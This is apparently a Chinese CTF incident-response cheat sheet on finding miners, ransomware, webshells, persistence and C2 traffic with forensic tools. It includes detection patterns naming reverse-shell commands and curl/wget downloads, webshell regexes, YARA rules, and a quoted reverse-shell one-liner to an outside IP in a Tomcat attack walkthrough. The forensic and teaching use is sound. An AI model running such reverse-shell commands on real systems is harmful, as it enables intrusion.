# 应急响应专项 Skill — 挖矿/勒索/后门检测

## 适用场景
服务器被入侵、挖矿病毒、勒索软件、Webshell 检测、权限维持分析。

来源: 青少年CTF应急响应靶场 + 运维初赛经验

## 工具清单

| 工具 | 用途 | 路径 |
|------|------|------|
| `volatility3` | 内存取证 | pip |
| `win_forensics.py` | Windows 取证 | `E:\CompetitionTools\scripts\win_forensics.py` |
| `yara` | 恶意代码规则扫描 | scooped |
| `hashcat` | 密码哈希破解 | scooped |
| `sqlite3` | 浏览器/IM 数据库 | scooped |
| `tshark` | 流量分析 | scooped |
| `olevba` | 恶意宏分析 | pip |
| `sam-crack` | SAM 密码提取 | `E:\CompetitionTools\bin\sam-crack.bat` i|

## 应急响应标准流程

### 1. 进程分析 — 找恶意进程

```bash
# 内存镜像 → volatility3
vol -f memory.dump windows.pslist.PsList          # 进程列表
vol -f memory.dump windows.cmdline.CmdLine        # 进程命令行
vol -f memory.dump windows.psscan.PsScan          # 隐藏进程扫描
vol -f memory.dump windows.netscan.NetScan        # 网络连接

# Linux 内存
vol -f memory.dump linux.pslist.PsList
vol -f memory.dump linux.psaux.PsAux              # 带参数
vol -f memory.dump linux.sockstat.Sockstat        # 网络连接

# 可疑进程特征:
# - 高 CPU 进程名: kdevtmpfsi, kinsing, xmrig
# - 随机字符串进程名: a7b3c9d2
# - 从 /tmp 或 /dev/shm 运行的进程
# - 反弹 shell: /bin/sh -i, bash -i, nc -e
```

### 2. 持久化检测

```bash
# Windows 持久化:
# - 计划任务: vol windows.scheduled_tasks.ScheduledTasks
# - 服务: vol windows.svclist.SvcList
# - 注册表 Run 键: vol windows.registry.printkey.PrintKey
# - 启动文件夹: 检查 Users/*/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/

# Linux 持久化:
# - crontab: vol linux.bash.Bash → 找 crontab -e 命令
# - systemd service: 检查 /etc/systemd/system/
# - .bashrc / .profile: icat 提取后 grep "curl|wget|nc|bash"
# - SSH authorized_keys: icat 提取
```

### 3. 网络连接分析

```bash
# 查看进程网络连接
vol -f memory.dump windows.netscan.NetScan
vol -f memory.dump linux.sockstat.Sockstat

# 可疑连接特征:
# - 连接到境外未知 IP
# - 非标准端口 (4444, 5555, 6666, 7777, 8888, 9999, 1337)
# - 矿池连接: pool.supportxmr.com, xmr-eu1.nanopool.org
# - C2 心跳: 定期小流量
```

### 4. 恶意文件检测

```bash
# 扫描已知恶意软件签名
yara -r rules/malware_index.yar /mnt/evidence/

# 检查文件哈希 → 查 VirusTotal
md5sum suspicious.exe
sha256sum suspicious.exe

# 提取恶意代码中的字符串
strings suspicious.exe | rg -i "http|bitcoin|wallet|miner|pool|encrypt|ransom"
floss suspicious.exe  # FLARE Obfuscated String Solver
```

### 5. 日志分析

```bash
# Windows 事件日志 → win_forensics.py
python win_forensics.py -d /mnt/windows/

# 关键 Event ID:
# 4624: 登录成功
# 4625: 登录失败
# 4672: 特殊权限登录
# 4688: 进程创建
# 4697: 服务安装
# 7045: 新服务
# 4104: PowerShell 脚本块

# Linux 日志
# /var/log/auth.log: 登录
# /var/log/syslog: 系统
# ~/.bash_history: 命令历史
```

### 6. Webshell 检测

```bash
# 特征搜索
rg -r "(eval|exec|system|passthru|shell_exec|popen|proc_open)\(.*\$_(GET|POST|REQUEST)" /var/www/
rg -r "base64_decode\(.*\$_(GET|POST)" /var/www/

# 最近修改的 PHP 文件
fd "\.php$" /var/www/ --changed-within 7d

# 检查 .htaccess 是否被篡改
rg -r "AddType.*application/x-httpd-php" /var/www/
```

## 挖矿病毒专项

```bash
# 1. 找高 CPU 进程
vol -f mem.dump linux.psaux.PsAux | rg -i "miner|xmrig|kdevtmpfsi|kinsing|systemd-network"

# 2. 找矿池连接
vol -f mem.dump linux.sockstat.Sockstat | rg "pool|stratum|xmr|monero"

# 3. 找挖矿配置文件
icat ... | rg -i "pool|wallet|worker|cpu|thread"

# 4. 找 crontab 持久化
vol -f mem.dump linux.bash.Bash | rg "crontab|curl.*sh|wget.*sh"
```

## 勒索软件专项

```bash
# 1. 找勒索信
fls -o $OFFSET -r disk.img | rg -i "README|HOW_TO_DECRYPT|ransom|decrypt"

# 2. 找加密痕迹
strings disk.img | rg -i "encrypt|decrypt|locked|bitcoin|wallet"

# 3. 找加密程序
fls -o $OFFSET -r disk.img | rg "\.exe$|\.elf$|\.py$" | rg -v "Windows/System32"

# 4. 逆向加密逻辑 → 写解密脚本
# 参考: mp4_stco_fix.py (FIC 2026 案例)
```

## 快速检查清单

```
□ 进程: 是否有异常高 CPU / 随机名进程
□ 网络: 是否有可疑外连 / 矿池地址
□ 持久化: cron / 计划任务 / 服务 / 注册表 Run
□ 用户: 是否有新增用户 / 异常登录
□ 文件: 最近创建/修改的可疑文件
□ 日志: 安全日志 / auth.log 中的异常
□ Web: 是否有新 Webshell / 可疑 PHP
```

## 常用 YARA 规则速查

```yara
rule webshell_php {
    strings:
        $s1 = "eval("
        $s2 = "base64_decode"
        $s3 = "shell_exec"
        $s4 = "passthru"
    condition:
        2 of them
}

rule miner_process {
    strings:
        $s1 = "xmrig"
        $s2 = "stratum"
        $s3 = "mining"
        $s4 = "cryptonight"
    condition:
        any of them
}
```

---

## 补充专题: ctf-skills 恶意代码+反取证 (2025-2026)

### 恶意代码快速分析
```bash
file suspicious && strings -n 8 suspicious | head -50
peframe malware.exe           # PE 快速分诊
python -c "import pefile; pefile.PE('mal.exe').dump_info()"
```

### 常见恶意代码模式
| 模式 | 检测 |
|------|------|
| `certutil -decode` | base64 解码滥用 (Living-off-the-land) |
| `bitsadmin /transfer` | 后台下载 |
| `UEsD` (base64 的 `PK\x03`) | 内存中 base64 编码的 ZIP |
| NOP sleds / push-pop 对 | 垃圾代码 |
| PyInstaller + PyArmor | pyinstxtractor → PyArmor-Unpacker |

### 加密算法识别
```
AES:     S-box 以 0x63,0x7c,0x77,0x7b 开头
ChaCha20: "expand 32-byte k" 字符串
TEA/XTEA: 0x9E3779B9 常量
RC4:      256 字节顺序 S-box 初始化
```

### C2 通信分析
```bash
strings malware | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | sort -u
# Beacon 检测: 固定间隔的周期性流量
```

### Windows 反取证检测清单
```
日志清除 (EventID 1102) 后仍可用的证据:
  1. USN Journal ($J) — 文件变更时间线
  2. SAM 注册表 — 用户创建时间戳
  3. PowerShell 历史 — ConsoleHost_history.txt
  4. Prefetch — 已执行程序列表
  5. MFT — 文件元数据 + Resident Data
  6. Defender MPLog — 威胁检测日志 (独立于 EventLog)
  7. RDP 日志 — TerminalServices (独立于 Security.evtx)
  8. 浏览器历史 — SQLite 在 AppData
  9. 注册表键最后修改时间
  10. WMI Repository — OBJECTS.DATA
```

### cipher.exe 擦除痕迹
```bash
# EFSTMPWP 目录 → cipher.exe /w 已覆盖空闲空间
# → 放弃文件恢复, 转投其他证据源
```

### certutil base64 ZIP 恢复
```bash
# 内存中搜索 "UEsD" (= base64 的 PK\x03)
strings memory.dmp | grep -o 'UEsD[A-Za-z0-9+/=]*' | while read line; do
  echo "$line===" | base64 -d > candidate.zip
  file candidate.zip | grep -q "Zip" && break
done
```

### YARA 规则速查
```yara
rule xor_decoder {
    strings: $ = { 31 ?? 80 ?? ?? 4? 75 }  // XOR loop
    condition: any of them
}
rule certutil_abuse {
    strings: $ = "certutil" $ = "-decode"
    condition: all of them
}
```

### Volatility 恶意代码插件
```bash
vol -f mem.dmp windows.malfind.Malfind     # 注入代码检测
vol -f mem.dmp windows.pstree.PsTree       # 可疑父子进程
vol -f mem.dmp windows.dlllist.DllList     # 可疑 DLL
vol -f mem.dmp windows.cmdline.CmdLine     # 恶意命令行
vol -f mem.dmp windows.clipboard           # 复制粘贴的密码!
vol -f mem.dmp windows.netscan.NetScan     # C2 连接
```

---

## Tomcat 攻击全链路分析 (DIDCTF 2025数证杯)

### 攻击链识别
```bash
# Step 1: SYN 端口扫描 → 找攻击者 IP
tshark -r capture.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0" | wc -l  # 大量SYN = 扫描
# Step 2: 目录爆破 → User-Agent 特征
tshark -r capture.pcap -Y "http.user_agent contains gobuster"    # gobuster
tshark -r capture.pcap -Y "http.user_agent contains Nmap"        # Nmap NSE
# Step 3: 登录爆破 → HTTP POST + Authorization Basic
tshark -r capture.pcap -Y "http.authorization"   # Base64 → admin:tomcat
# Step 4: WAR 文件上传 → 部署 webshell
tshark -r capture.pcap -Y "http.request.uri contains .war"
# Step 5: 反弹 shell 持久化
tshark -r capture.pcap -Y "tcp.port eq 443" -Y "ip.dst == <attacker_ip>"
# 典型反弹shell: /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
```

### MSF Payload 类型识别
```bash
# bind_tcp: 目标开端口，攻击者主动连接 (常见于 Windows)
# 特征: Windows CMD 提示符 "C:\WWW\data\admin>" + whoami 等命令
# reverse_tcp: 目标主动连接攻击者 (常见于 Linux, 过防火墙)
# meterpreter: "meterpreter>" 提示符 + getuid/TLV 指令
# 判断方法: 追踪 tcp.port eq <端口> → 看提示符和命令
```

### 端口扫描开放端口判断
```bash
# 单个SYN=端口不存在, 多个来往包=端口开放
tshark -r capture.pcap -q -z conv,tcp   # 统计 TCP 会话
# count=2 且无数据传输 → 端口关闭 (SYN→RST)
# count>2 且有后续数据 → 端口开放 (SYN→SYN-ACK→ACK→PSH)
```

### 蚁剑流量完整分析
```bash
# 特征: POST 到同一URL, 参数值经混淆
# 解码: 第一个参数值 → 去前2字符 → base64 → 命令
# 例: "MJY2QgL2QgIkM6..." → 去MJ → "Y2QgL2QgIkM..." → base64 → cd /d "C:/WWW/..."
```
